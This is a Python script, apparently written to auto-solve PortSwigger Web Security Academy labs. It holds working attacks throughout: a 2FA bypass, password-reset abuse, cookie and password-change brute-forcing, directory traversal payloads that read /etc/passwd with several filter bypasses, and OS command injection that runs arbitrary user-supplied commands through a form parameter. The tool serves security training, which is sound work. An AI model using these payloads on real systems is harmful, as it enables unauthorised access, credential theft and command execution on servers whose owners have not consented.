#!/usr/bin/python3
import os
import sys
import time
import signal
import base64
import hashlib
import warnings
import requests
from tqdm import tqdm
from art import text2art
from bs4 import BeautifulSoup
from rich.console import Console

# Special thanks to Rana Khalil for teaching me the knowledge to write this tool by "Web Security Academy Series Course"

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

s = requests.Session()

warnings.filterwarnings("ignore")


def signal_handler(signal, frame):
    print("\nPlease write \"exit\" to exit!")


signal.signal(signal.SIGINT, signal_handler)


def paas():
    os.system('clear')
    art=text2art("PAAS")
    print(art)
    print("[P]ortSwigger [A]cademy [A]utomatic [S]olver")
    print("by mr246\n")
    loadingEffect("", 0.4)


def get_csrf_token(path, url):
    feedback_path = str(path)
    r = s.get(url + feedback_path, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    csrf = soup.find("input")["value"]
    return csrf


def loadingEffect(effectText, effectTime):
    console = Console()
    with console.status(f"[bold green]{effectText}"):
        time.sleep(effectTime)


def encode_all(inputToEncode):
    return "".join("%{0:0>2x}".format(ord(char)) for char in inputToEncode)


def pressAnyKey():
    loadingEffect("...", 1)
    checkCommand(input("\npress any key to continue..."))
    paas()


def checkUrl(url):
    if url.count("/") >= 3:
        url = "/".join(url.split("/")[:3])

    return url


def checkCommand(cmd):
    if cmd == "exit":
        print("\nGoodbye :D")
        sys.exit(-1)

    return cmd


def createUserList(labName):
    checkCommand(input("\npress any key to see user list..."))

    loadingEffect("creating user list...", 2)

    paas()
    print("userlist successfully created!\n")

    print("==== USER LIST ====")
    if labName == "Auth3":
        for i in range(150):
            if i % 3:
                print("carlos")
            else:
                print("wiener")
    print("==== THE END OF THE USER LIST ====")

    checkCommand(input("\npress any key to continue"))
    paas()


def createPasswordList(labName):
    checkCommand(input("\npress any key to see password list..."))

    loadingEffect("creating password list...", 2)

    paas()
    print("password list successfully created!\n")

    print("==== PASSWORD LIST ====")
    if labName == "Auth3":
        with open("auth345p", "r") as p:
            passwords = p.readlines()

        i = 0
        for pwd in passwords:
            if i % 3:
                print(pwd.strip("\n"))
            else:
                print("peter")
                print(pwd.strip("\n"))
                i = i +1
            i = i +1
    print("==== THE END OF THE PASSWORD LIST ====")

    checkCommand(input("\npress any key to continue"))
    paas()


def invalidCharacterNumber():
    print("Enter a valid category number!")
    print("It is not a valid category number.")
    loadingEffect("tool is closing...", 3)
    sys.exit(-1)


def authentication():
    paas()
    print("== Authentication Menu ==")
    menu_options = {
        1: "2FA Simple Bypass",
        2: "Password reset broken logic",
        3: "Broken brute-force protection, IP block",
        4: "Brute-forcing a stay-logged-in cookie",
        5: "Password brute-force via password change"
    }
    for key, value in menu_options.items():
        print(f"[{key}] {value}")

    inpt = int(checkCommand(input("\nSelect Lab: ")))

    if 1 <= inpt <= 5:
        paas()
        print(f"== Authentication/{menu_options[inpt]} ==\n")

        if inpt == 1:
            print("example: https://lab-id.web-security-academy.net/")
            url = checkCommand(checkUrl(input("url: ")))

            # Log into Carlos's account
            paas()
            print("(+) Logging into account and bypassing 2FA verification...")
            login_url = url + "/login"
            login_data = {"username": "carlos", "password": "montoya"}
            r = s.post(login_url, data=login_data, allow_redirects=False, verify=False, proxies=proxies)

            # Confirm bypass
            myaccount_url = url + "/my-account"
            r = s.get(myaccount_url, verify=False, proxies=proxies)
            if "Log out" in r.text:
                paas()
                print("(+) Successfully bypassed 2FA verification.")
                print("(+) enjoy :D")
            else:
                print("(-) Exploit failed.")
                sys.exit(-1)

        if inpt == 2:
            print("example: https://lab-id.web-security-academy.net/")
            url = checkCommand(checkUrl(input("url: ")))

            # Reset Carlos's password
            pass_reset_url = url + "/forgot-password?temp-forgot-password-token=ilovekokorec"
            pass_reset_data = {"temp-forgot-password-token": "ilovekokorec", "username": "carlos",
                               "new-password-1": "kokorec", "new-password-2": "kokorec"}
            r = s.post(pass_reset_url, data=pass_reset_data, verify=False, proxies=proxies)

            # Access Carlos's account
            paas()
            print("(+) Logging into account...")
            login_url = url + "/login"
            login_data = {"username": "carlos", "password": "kokorec"}
            r = s.post(login_url, data=login_data, verify=False, proxies=proxies)

            # Confirm exploit worked
            if "Log out" in r.text:
                paas()
                print("(+) Successfully logged into Carlos's account.")
                print("(+) enjoy :D")
            else:
                print("(-) Exploit failed.")
                sys.exit(-1)

        if inpt == 3:
            print("This lab is not have fully automated solve in PAAS.")
            print("Follow the instructions for the solve the lab.")
            pressAnyKey()

            # Lab instructions
            print("[1] Capture login request in Burp and right click send to Intruder")
            print(
                "[2] Intruder -> Resource Pool -> select \"Create new resource pool\"\n-> select \"Maximum concurrent requests\" and set to 1")
            pressAnyKey()

            print("== Authentication/Broken brute-force protection, IP block ==\n")
            print("[3] Select \"Pitchfork\" attack type")
            print("[4] Positions -> click \"clear\", select both of username and password inputs and click \"add\"")
            print("example: \"username=§wiener§&password=§peter§\"")
            pressAnyKey()

            print("== Authentication/Broken brute-force protection, IP block ==\n")
            print(
                "[5] Copy the username list below after pressing any key and paste it for \"payload set 1\" in the \"Payloads\"")

            # creating user list
            createUserList("Auth3")

            print(
                "[6] Copy the pasword list below after pressing any key and paste it for \"payload set 2\" in the \"Payloads\"")

            # creating password list
            createPasswordList("Auth3")

            print("[7] Click \"Start attack\" and wait until the attack is over")
            print("[8] Sort the list by \"Status\" 302")
            print("[9] The password in the column where carlos is 302 is correct password")
            print("[10] Login to the site with this credentials and solve the lab")
            pressAnyKey()
            print("Congratulations!")
            print("See you in the next lab! :D")
            sys.exit(-1)

        if inpt == 4:
            print("example: https://lab-id.web-security-academy.net/")
            url = checkCommand(checkUrl(input("url: ")))

            print("\nGenerating cookies and running attack...")

            with open("auth345p", "r") as p:
                for pwd in p:
                    hashed_pass = hashlib.md5(pwd.rstrip("\n").encode("utf-8")).hexdigest()
                    username_hashed_pass = "carlos:" + hashed_pass
                    encoded_pass = base64.b64encode(bytes(username_hashed_pass, "utf-8"))
                    true_creds = encoded_pass.decode("utf-8")

                    myaccount_url = url + "/my-account"
                    cookies = {"stay-logged-in": true_creds}
                    req = s.get(myaccount_url, cookies=cookies, verify=False, proxies=proxies)
                    if "Log out" in req.text:
                        print(f"\n[+] Valid credentials found! \nCredentials: carlos:{pwd}")
                        sys.exit(-1)
                print("[-] Attack failed!")

        if inpt == 5:
            print("example: https://lab-id.web-security-academy.net/")
            url = checkCommand(checkUrl(input("url: ")))

            # Log in to Wiener's account
            print("\n[+] Log into Wiener's account...")
            login_url = url + "/login"
            login_data = {"username": "wiener", "password": "peter"}
            r = s.post(login_url, data=login_data, verify=False, proxies=proxies)

            # Brute forcing Carlos's account via password reset mechanism
            print("[+] Attacking...")
            change_password_url = url + "/my-account/change-password"

            with open("auth345p", "r") as f:
                lines = f.readlines()

            for pwd in lines:
                pwd = pwd.strip("\n")
                change_password_data = {"username": "carlos", "current-password": pwd, "new-password-1": "test", "new-password-2": "test2"}
                r = s.post(change_password_url, data=change_password_data ,verify=False, proxies=proxies)

                # Verify brute force is working
                if "New passwords do not match" in r.text:
                    print("[+] Carlos\'s password found: " + pwd)

                    # Log in to Carlos's account
                    print("[+] Log into Carlos's account...")
                    login_url = url + "/login"
                    login_data = {"username": "carlos", "password": pwd}
                    r = s.post(login_url, data=login_data, verify=False, proxies=proxies)
                    print("\n[+] Exploit successfully completed!")

        else:
            invalidCharacterNumber()


def directoryTraversal():
    paas()
    print("== Directory Traversal Menu ==")
    menu_options = {
        1: "File path traversal, simple case",
        2: "Traversal sequences blocked with absolute path bypass",
        3: "Traversal sequences stripped non-recursively",
        4: "Traversal sequences stripped with superfluous URL-decode",
        5: "Validation of start of path",
        6: "Validation of file extension with null byte bypass"
    }
    for key, value in menu_options.items():
        print(f"[{key}] {value}")

    inpt = int(checkCommand(input("\nSelect Lab: ")))

    if 1 <= inpt <= 6:
        paas()
        print(f"== Directory Traversal/{menu_options[inpt]} ==\n")

        print("example: https://lab-id.web-security-academy.net/")
        url = checkCommand(checkUrl(input("url: ")))

        if inpt == 1:
            image_url = url + "/image?filename=../../../../etc/passwd"
        elif inpt == 2:
            image_url = url + "/image?filename=/etc/passwd"
        elif inpt == 3:
            image_url = url + "/image?filename=....//....//....//etc/passwd"
        elif inpt == 4:
            img_url_need_encode = "../../../etc/passwd"
            img_url_encoded = encode_all(img_url_need_encode)
            img_url_double_encoded = encode_all(img_url_encoded)
            image_url = url + "/image?filename=" + img_url_double_encoded
        elif inpt == 5:
            image_url = url + "/image?filename=/var/www/images/../../../etc/passwd"
        elif inpt == 6:
            image_url = url + "/image?filename=../../../etc/passwd%0048.jpg"

        s = requests.get(image_url, verify=False, proxies=proxies)
        if "root:x" in s.text:
            loadingEffect("attacking", 3)
            print("\n[+] attack successfully completed.")
            print("\n==== CONTENT OF THE /etc/passwd FILE ====\n")
            print(s.text)
            print("==== END OF THE /etc/passwd FILE ====")
        else:
            print("\n[-] Exploit failed.")
            sys.exit(-1)

    else:
        invalidCharacterNumber()


def osCommandInjection():
    paas()
    print("== Os Command Injection Menu ==")
    menu_options = {
        1: "OS command injection, simple case",
        2: "Blind OS command injection with time delays",
        3: "Blind OS command injection with output redirection"
    }
    for key, value in menu_options.items():
        print(f"[{key}] {value}")

    inpt = int(checkCommand(input("\nSelect Lab: ")))

    if 1 <= inpt <= 3:
        paas()
        print(f"== OS Command Injection/{menu_options[inpt]} ==\n")

        print("example: https://lab-id.web-security-academy.net/")
        url = checkCommand(checkUrl(input("url: ")))

        if inpt == 1:
            command = checkCommand(input("command: "))

            loadingEffect("attacking...", 2)

            stock_check_url = url + "/product/stock"
            injection_code = "1 & " + command
            parameters = {"productId": "1", "storeId": injection_code}
            r = requests.post(stock_check_url, data=parameters, verify=False, proxies=proxies)

            if len(r.text) > 3:
                print("[+] Attack successfully completed! ")
                print("\n[+] Return from the target: " + r.text)
            else:
                print("[-] Attack failed!")
        elif inpt == 2:
            # Getting CSRF Token
            print("\n[+] Getting CSRF Token..." )
            feedback_path = "/feedback"
            csrf_token = get_csrf_token(feedback_path, url)

            # Exploit
            print("[+] Attempting an injection...")
            submit_feedback_url = url + "/feedback/submit"
            injection = "test@testmail.com & sleep 10 #"
            data = {"csrf": csrf_token, "name": "test", "email": injection, "subject": "test", "message": "test"}
            res = s.post(submit_feedback_url, data=data, verify=False, proxies=proxies)

            # Verify exploit
            if (res.elapsed.total_seconds() >= 10):
                print("\n[+] Attack successfully completed.")
                print("[+] \"email\" field vulnerable to time-based command injection!")
            else:
                print("[-] Attack is not successfully completed.")
        elif inpt == 3:
            # Getting CSRF Token
            print("\n[+] Getting CSRF Token...")
            feedback_path = "/feedback"
            csrf_token = get_csrf_token(feedback_path, url)

            # Exploit
            submit_feedback_url = url + "/feedback/submit"
            injection = "test@testmail.com & whoami > /var/www/images/commandinjection.txt #"
            data = {"csrf": csrf_token, "name": "test", "email": injection, "subject": "test", "message": "test"}
            res = s.post(submit_feedback_url, data=data, verify=False, proxies=proxies)

            # Verify exploit
            file_path = "/image?filename=commandinjection.txt"
            res2 = s.get(url + file_path, verify=False, proxies=proxies)
            if (res2.status_code == 200):
                print("\n[+] Attack successfully completed.")
                print("[+] \"email\" field vulnerable to time-based command injection!")
            else:
                print("[-] Attack is not successfully completed.")

    else:
        invalidCharacterNumber()


def main():
    # paas ascii art
    paas()

    # loading bar
    for i in tqdm(range(100),
                  desc="Loading…",
                  ascii=False):
        time.sleep(0.006)
    paas()
    time.sleep(0.4)

    # main menu
    menu_options = {
        1: "Authentication Labs",
        2: "Directory Traversal Labs",
        3: "OS Command Injection Labs",
        4: "[coming soon...] Access Control Vulnerabilities Labs "
    }
    for key, value in menu_options.items():
        print(f"[{key}] {value}")

    try:
        inpt = checkCommand(input("\nSelect Vulnerability: "))
        if int(inpt) == 1:
            authentication()
        elif int(inpt) == 2:
            directoryTraversal()
        elif int(inpt) == 3:
            osCommandInjection()
        elif int(inpt) <= 0 or int(inpt) >= 4:
            text = inpt + " is not a valid category number! Closing..."
            loadingEffect(text, 3)
            sys.exit(-1)
    except Exception as e:
        paas()

        # print error for development
        print(e)

        print("Invalid Input!")
        loadingEffect("tool is closing...", 3)
        sys.exit(-1)


if __name__ == "__main__":
    main()
